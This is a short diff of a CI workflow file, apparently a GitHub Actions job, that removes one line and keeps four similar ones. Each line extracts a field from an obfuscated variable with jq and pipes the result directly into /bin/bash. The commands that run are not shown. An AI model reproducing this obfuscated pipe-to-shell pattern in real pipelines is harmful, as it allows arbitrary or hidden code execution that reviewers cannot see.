@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
           echo $ic0531 | jq -r .c6 | /bin/bash
           printf '%s' "$g3" | jq -r .nwagt3577 | /bin/bash
-          printf '%s' "$qldl08" | jq -r .jmjb36 | /bin/bash
           printf '%s' "$av613" | jq -r .b8 | /bin/bash
 
       - name: Archive results
